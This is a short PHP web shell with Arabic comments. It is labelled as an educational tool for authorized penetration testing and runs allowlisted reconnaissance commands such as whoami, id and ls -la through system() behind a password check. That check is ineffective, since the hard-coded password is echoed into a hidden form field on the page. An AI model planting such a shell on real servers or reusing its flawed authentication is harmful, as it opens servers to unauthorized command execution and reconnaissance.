<?php
// =====================================================
// Web Shell تعليمي لأغراض اختبار الاختراق المصرح به فقط
// =====================================================
// يتطلب هذا الملف كلمة مرور ومفتاح خاص ليعمل
// يقتصر تنفيذ الأوامر على أوامر مخصصة فقط (خفيفة)

$password = "SecureTestPass123"; // كلمة مرور قوية - غيرها قبل الاستخدام

if(!isset($_POST['pass']) || $_POST['pass'] !== $password) {
    die("Access Denied - Unauthorized Request");
}

$allowed_commands = ['whoami', 'id', 'pwd', 'ls -la', 'date', 'hostname'];

if(isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    
    // السماح فقط بالأوامر المحددة مسبقًا - لمنع أي ضرر غير مقصود
    if(in_array($cmd, $allowed_commands)) {
        echo "<pre>";
        system($cmd);
        echo "</pre>";
        echo "<hr>";
        echo "<small>Security Test Completed: Command executed successfully.</small>";
    } else {
        echo "Command not allowed for safety reasons. Allowed: " . implode(", ", $allowed_commands);
    }
}

// واجهة بسيطة
echo '<form method="POST">
    <input type="hidden" name="pass" value="'.$password.'">
    <select name="cmd">
        <option value="whoami">whoami - معرف المستخدم</option>
        <option value="id">id - معرفات النظام</option>
        <option value="pwd">pwd - المجلد الحالي</option>
        <option value="ls -la">ls -la - محتويات المجلد</option>
        <option value="date">date - تاريخ ووقت السيرفر</option>
        <option value="hostname">hostname - اسم السيرفر</option>
    </select>
    <button type="submit">تنفيذ</button>
</form>';
?>
